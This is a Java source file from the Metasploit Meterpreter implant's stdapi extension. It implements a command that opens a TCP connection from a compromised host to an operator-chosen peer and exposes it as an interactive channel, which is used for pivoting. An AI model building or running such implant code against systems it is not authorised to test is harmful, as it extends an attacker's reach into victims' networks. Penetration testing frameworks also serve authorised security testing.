package com.metasploit.meterpreter.stdapi;

import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;

import com.metasploit.meterpreter.Channel;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.SocketChannel;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class channel_create_stdapi_net_tcp_client implements Command {

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		String peerHost = request.getStringValue(TLVType.TLV_TYPE_PEER_HOST);
		int peerPort = request.getIntValue(TLVType.TLV_TYPE_PEER_PORT);
		String localHost = request.getStringValue(TLVType.TLV_TYPE_LOCAL_HOST);
		int localPort = request.getIntValue(TLVType.TLV_TYPE_LOCAL_PORT);
		int retries = ((Integer) request.getValue(TLVType.TLV_TYPE_CONNECT_RETRIES, new Integer(1))).intValue();
		if (retries < 1)
			retries = 1;
		InetAddress peerAddr = InetAddress.getByName(peerHost);
		InetAddress localAddr = InetAddress.getByName(localHost);
		Socket socket = null;
		for (int i = 0; i < retries; i++) {
			try {
				socket = new Socket(peerAddr, peerPort, localAddr, localPort);
				break;
			} catch (ConnectException ex) {
				if (i == retries - 1)
					throw ex;
			}
		}

		// If we got here, the connection worked, respond with the new channel ID
		Channel channel = new SocketChannel(meterpreter, socket);
		channel.startInteract();
		response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
		return ERROR_SUCCESS;
	}
}
